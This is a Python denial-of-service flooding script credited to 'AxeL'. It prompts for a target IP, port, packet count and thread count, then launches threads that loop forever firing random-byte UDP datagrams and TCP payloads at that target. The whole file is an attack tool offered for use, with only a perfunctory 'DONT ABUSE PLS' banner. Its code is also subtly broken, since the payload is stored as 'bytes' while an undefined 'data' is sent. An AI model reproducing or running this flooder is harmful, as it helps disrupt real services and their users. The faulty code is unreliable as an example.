#!/usr/bin/env python3
#/CODE PUNYA AXEL
import struct
import time
import socket
import random
import threading
import os
import sys

os.system ("clear")
print ("""
\033[96m
     _              _     ___  ____  _____ _____
    / \   __  _____| |   / _ \|  _ \| ____|__  /
   / _ \  \ \/ / _ \ |  | | | | |_) |  _|   / / 
  / ___ \  >  <  __/ |__| |_| |  _ <| |___ / /_ 
 /_/   \_\/_/\_\___|_____\___/|_| \_\_____/____|
                                                
                    TOOLS BY AxeL
                    DONT ABUSE PLS
""")

ip = str(input("\033[91m=====> IP Target    : "))
port = int(input("=====> Port Target  : "))
times = int(input("=====> $ Kirim PACKETS : "))
threads = int(input("=====> $ Kirim THREADS : "))
choice = str(input("=====> Ready? (y/n) : "))
#Starting Attacking

def run():
  bytes = random._urandom(65534)
  i = random.choice(("\033[97m[ $ ]","[ ! ]","[ # ]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"\033[92m Packet From AxeL to \033[91m{}:{}".format(ip,port))
    except:
      print("\033[92m[ • ]\033[91m Timed Out")

def run2():
  bytes = random._urandom(102400)
  i = random.choice(("\033[97m[ $ ]","[ ! ]","[ # ]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((ip,port))
      s.send(data)
      for x in range(times):
        s.send(data)
      print(i +"\033[92m Packet From AxeL To \033[91m{}:{}".format(ip,port))
    except:
      s.close()
      print("\033[92m[ • ]\033[91m Timed Out")

def run3():
  bytes = random._urandom(577)
  i = random.choice(("\033[97m[ $ ]","[ ! ]","[ # ]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"\033[92m Packet From AxeL to \033[91m{}:{}".format(ip,port))
    except:
      print("\033[92m[ • ]\033[91m Timed Out")


for y in range(threads):

	if choice == 'y':

		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
	else:
		th = threading.Thread(target = run3)
		th.start()
